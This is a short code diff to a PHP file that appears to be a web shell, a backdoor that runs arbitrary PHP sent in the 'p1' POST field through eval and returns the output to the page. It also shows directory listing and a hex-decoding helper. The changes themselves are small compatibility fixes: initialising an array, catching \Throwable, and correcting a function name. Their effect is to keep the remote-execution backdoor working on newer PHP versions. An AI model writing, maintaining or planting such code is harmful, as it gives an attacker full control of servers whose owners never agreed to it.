@@ -691,6 +691,7 @@ try {
 			return scandir($dir);
 		} else {
 			$dh = opendir($dir);
+			$files = [];
 			while (false !== ($filename = readdir($dh))) $files[] = $filename;
 			return $files;
 		}
@@ -806,7 +807,7 @@ try {
 			try {
 				eval($_POST['p1']);
 			}
-			catch(Exception $e) {
+			catch(\Throwable $e) {
 				echo $e->getMessage();
 			}
 			$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
@@ -833,7 +834,7 @@ try {
 			try {
 				eval($_POST['p1']);
 			}
-			catch(Exception $e) {
+			catch(\Throwable $e) {
 				echo $e->getMessage();
 			}
 			echo htmlspecialchars(ob_get_clean());
@@ -1057,7 +1058,7 @@ try {
 			if (!function_exists('hex2ascii')) {
 				function hex2ascii($p) {
 					$r = '';
-					for ($i = 0;$i < strLen($p);$i+= 2) {
+					for ($i = 0;$i < strlen($p);$i+= 2) {
 						$r.= chr(hexdec($p[$i] . $p[$i + 1]));
 					}
 					return $r;
